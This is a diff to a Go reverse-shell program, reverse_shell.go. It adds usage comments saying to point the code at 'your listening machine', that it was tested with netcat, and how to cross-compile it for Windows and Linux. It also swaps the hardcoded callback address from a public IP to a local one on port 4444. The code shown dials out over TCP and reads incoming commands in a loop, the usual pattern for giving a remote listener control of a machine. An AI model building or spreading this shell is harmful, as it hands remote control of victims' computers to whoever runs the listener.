@@ -1,3 +1,7 @@
+// Change the IP address to your listening machine. This has been tested with netcat.
+// To build for Windows use 'env GOOS=windows GOARCH=your_arch_here go build reverse_shell.go'
+// To build for Linux use 'env GOOS=linux GOARCH=your_arch_here go build reverse_shell.go
+
 package main
 
 import (
@@ -9,7 +13,7 @@ import (
 )
 
 func main() {
-	conn, _ := net.Dial("tcp", "18.222.152.92:8081")
+	conn, _ := net.Dial("tcp", "192.168.86.1:4444")
 	for {
 
 		message, _ := bufio.NewReader(conn).ReadString('\n')
